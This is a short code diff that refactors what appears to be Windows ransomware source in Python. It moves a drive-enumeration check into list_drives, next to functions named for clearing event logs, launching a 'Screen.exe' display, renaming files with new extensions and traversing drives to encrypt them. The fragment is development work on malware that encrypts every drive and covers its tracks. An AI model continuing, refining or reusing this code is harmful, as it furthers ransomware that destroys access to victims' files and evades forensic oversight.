@@ -81,15 +81,6 @@ def attempt_rem_event_logs():
         if result.returncode != 0: 
             pass
 
-def gather_all_drives():
-    drives = win32api.GetLogicalDriveStrings()
-    drives = drives.split('\000')[:-1]
-    
-    if len(drives) == 0:
-        sys.exit()
-        
-    return drives
-
 def launch_gui():
     path = os.path.join(os.getcwd(), "Screen.exe")
     subprocess.Popen([path])
@@ -136,6 +127,10 @@ def rename_file_with_counter(file_path, new_extension):
 def list_drives():
     drives = win32api.GetLogicalDriveStrings()
     drives = drives.split('\000')[:-1]
+    
+    if len(drives) == 0:
+        sys.exit()
+    
     return drives
 
 def traverse_encrypt(drive, key):
